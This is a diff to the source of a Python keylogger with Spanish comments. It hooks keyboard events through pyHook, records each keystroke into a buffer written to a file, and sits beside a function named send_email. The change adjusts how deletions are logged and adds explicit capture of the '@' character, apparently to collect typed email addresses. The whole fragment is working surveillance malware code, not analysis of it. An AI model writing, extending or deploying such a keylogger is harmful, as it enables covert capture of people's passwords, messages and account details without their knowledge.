@@ -53,8 +53,7 @@ def send_email(message):
     #vuelve a llamar el objeto hook manager
     hm.KeyDown = OnKeyboardEvent
     hm.HookKeyboard()
- 
- 
+  
 def OnKeyboardEvent(event):
     """
     entradas: como entrada global la variable count
@@ -95,8 +94,13 @@ def OnKeyboardEvent(event):
         if event.Ascii == 32:
             keylogs = ' '
         
-        if event.Ascii == 127:
-            keylogs = '(DELETE)'
+        #si se borra texto
+        if event.Ascii == 8:
+            keylogs = ' (DELETE) '
+        
+        #si se preciona @
+        if event.Ascii == 64:
+            keylogs = '@'
  
         buffer+=keylogs
         f.write(buffer)
